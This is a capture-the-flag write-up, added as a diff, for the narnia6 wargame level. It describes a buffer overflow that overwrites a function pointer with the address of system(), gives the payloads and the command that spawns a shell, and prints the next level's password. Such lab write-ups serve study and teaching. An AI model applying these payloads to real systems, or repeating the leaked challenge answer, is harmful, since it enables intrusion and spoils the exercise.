@@ -1,0 +1,45 @@
+narnia6 has some interesting code...
+
+The main idea: there are two buffers that are both filled in from argv.
+
+Environment variables and argv after 2 arguments are wiped.
+
+The code also assigns a function pointer to the address of puts (which we can overwrite!),
+It then calls the function with argv[1] as the parameter... initially 'puts'ing the argv[1].
+
+Unfortunately, putting shellcode on the stack isn't a possibility bc the code also checks if the address of the function pointer starts with 0xff, which is the stack...
+
+The solution is to find a function we can use in glibc, like system()!
+
+After a bit of testing, I found that a second argv value of the size below allows me to insert my own address into the function pointer |
+					 V
+___________________________________________________ 
+r "/bin/sh" "AAAAAAAABBBBCCCCaddresshereonout"
+___________________________________________________ 
+
+point address to system(), use 'print system' in gdb to find address
+0xf7dd76e0
+
+______________________________________________
+r "/bin/sh" "AAAAAAAABBBBCCCC\xe0\x76\xdd\xf7"
+______________________________________________
+
+^ Sort of worked, however it tells me that BBBCCC..etc" is not a command...
+
+So it seems to execute system("/bin/sh"), passing whats left in the stack to /bin/sh as a command... strange.
+
+After toying with it I found that I could get a proper shell if I just passed in sh; somewhere
+after it begins to pass in commands yielding this payload:
+
+______________________________________________
+payload = b'commandssh;abcde\x50\xc8\xe4\xf7'
+print(payload)
+______________________________________________
+
+Executing ./narnia6 "/bin/sh" $(python /tmp/payload.py) gives us a shell!
+
+$cat /etc/narnia_pass/narnia7
+ahkiaziphu
+
+~
+
